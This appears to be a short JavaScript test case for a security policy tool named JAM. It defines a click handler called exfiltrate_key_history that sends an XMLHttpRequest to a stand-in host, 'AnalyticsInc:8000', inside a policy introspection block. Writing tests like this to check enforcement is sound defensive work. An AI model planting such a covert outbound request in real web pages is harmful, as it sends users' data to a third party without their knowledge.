
JAM.startProfile('load');
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  introspect(JAM.policy.p1) {
    xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true)
  }
  xmlhttp.send(null);
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
